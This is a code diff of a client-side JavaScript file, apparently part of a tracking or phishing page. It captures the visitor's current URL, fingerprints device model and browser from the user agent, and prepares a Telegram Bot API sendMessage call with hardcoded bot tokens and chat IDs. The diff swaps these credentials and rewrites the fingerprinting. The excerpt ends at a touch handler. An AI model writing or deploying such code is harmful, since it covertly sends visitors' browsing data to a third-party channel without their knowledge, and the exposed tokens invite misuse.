@@ -1,28 +1,34 @@
- const device = require('device.js');
-
-let currentLocation = window.location;
+ let currentLocation = window.location;
 console.log(currentLocation);
 
-let botToken = '6735455497:AAHTFrKiu3NL-1jP_Qe3Qoi5vfvaUK2ByAY';
-let chatId = '5804614037';
+let botToken = '6163011453:AAE2E6uKEE1hyQ3knu7tjJpYwIDvS7yEQPg';
+let chatId = '5303172024';
 let messageText = currentLocation.href;
 
 let apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
 function getDeviceInfo() {
-  const currentDevice = device();
+  let userAgent = navigator.userAgent;
+  let browserInfo = `Браузер: ${navigator.appName} ${navigator.appVersion}`;
+  let model = "Unknown";
 
-  const isMobile = navigator.userAgent.toLowerCase().match(/mobile/i);
-
-
-
-  if (currentDevice.phone()) {
-    model = currentDevice.name || "Unknown";
+  if (/iPhone/.test(userAgent)) {
+    let match = userAgent.match(/iPhone\s([\w\d]+)/);
+    if (match) {
+      model = match[1];
+    } else {
+      model = "iPhone";
+    }
+  } else if (/iPad/.test(userAgent)) {
+    model = "iPad";
+  } else if (/Android/.test(userAgent)) {
+    let match = userAgent.match(/Android\s([^;]+)/);
+    if (match) {
+      model = match[1];
+    }
   }
 
-  let browserInfo = `Браузер: ${navigator.appCodeName} ${navigator.appVersion}`;
-
-  return `Пользователь ${isMobile}\n${browserInfo}`;
+  return `Пользователь ${model}\n${browserInfo}`;
 }
 
 function handleTouchStart(e) {
